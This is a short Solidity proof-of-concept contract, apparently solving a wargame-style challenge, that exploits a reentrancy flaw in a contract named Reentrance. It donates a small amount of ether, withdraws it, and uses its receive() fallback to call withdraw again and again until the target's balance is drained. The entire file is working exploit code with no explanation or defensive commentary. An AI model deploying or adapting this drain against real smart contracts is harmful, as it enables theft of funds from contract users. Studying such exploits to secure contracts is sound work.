pragma solidity ^0.8.22;

import "./reentrancy.sol";


contract ReentrancyPOC {

    Reentrance reentrance;

    constructor(address _reentrance) {
        reentrance = Reentrance(payable(_reentrance));
    }

    function exploit() external payable {
        reentrance.donate{value: 0.001 ether}(address(this));

        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        if (address(reentrance).balance > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }
}